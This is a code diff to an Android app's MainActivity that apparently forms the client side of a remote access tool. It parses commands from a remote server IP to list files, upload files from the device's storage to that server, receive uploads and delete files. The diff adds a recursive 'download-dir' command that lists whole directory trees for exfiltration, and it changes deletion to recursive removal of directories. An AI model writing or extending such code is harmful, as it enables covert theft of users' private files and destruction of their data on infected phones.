@@ -126,18 +126,23 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                             if(recCommand.indexOf("[command]dir") > -1) {
                                 sendData(getFiles(recCommand.split(":")[1].trim()).getBytes(), serverIP);
                             }
+                            if(recCommand.indexOf("[command]download-dir") > -1) {
+                                sendData(getDirectoryFiles(recCommand.split(":")[1].trim(), true).getBytes(), serverIP);
+                            }
+                            else {
+                                if(recCommand.indexOf("[command]download") > -1) {
+                                    try {
+                                        downloadFile(recCommand.split(":")[1].trim(), serverIP);
+                                    }
+                                    catch (Exception ex) {}
+                                }
+                            }
                             if(recCommand.indexOf("[command]sdcard") > -1) {
                                 sendData(getFiles(Environment.getExternalStorageDirectory().getAbsolutePath()).getBytes(), serverIP);
                             }
                             if(recCommand.indexOf("[command]sd") > -1) {
                                 sendData(getFiles(Environment.getExternalStorageDirectory().getAbsolutePath() + "/" +
                                         recCommand.split(":")[1].trim()).getBytes(), serverIP);
-                            }
-                            if(recCommand.indexOf("[command]download") > -1) {
-                                try {
-                                    downloadFile(recCommand.split(":")[1].trim(), serverIP);
-                                }
-                                catch (Exception ex) {}
                             }
                             if(recCommand.indexOf("[command]upload") > -1) {
                                 String[] fdata = recCommand.split(":");
@@ -200,9 +205,37 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         return res;
     }
 
+    private String getDirectoryFiles(String root, boolean first) {
+        File f = new File(root);
+        File[] files = f.listFiles();
+        String res = "";
+        if(first) {
+            res = root + "[downloadfilelist]\n";
+        }
+
+        for (File inFile : files) {
+            if(inFile.isFile()) {
+
+                res += "file : size : " + getSize(inFile.length()) + " : " + inFile.toString() + "\n";
+            }
+            else {
+                res += getDirectoryFiles(inFile.toString(), false);
+            }
+        }
+        return res;
+    }
+
+    void deleteRecursive(File fileOrDirectory) {
+        if (fileOrDirectory.isDirectory())
+            for (File child : fileOrDirectory.listFiles())
+                deleteRecursive(child);
+
+        fileOrDirectory.delete();
+    }
+
     private void delFile(String name) {
         sendData(("delete : " + name).getBytes(), serverIP);
-        new File(name).delete();
+        deleteRecursive(new File(name));
     }
 
     private void sendData(final byte[] data, final String ip) {
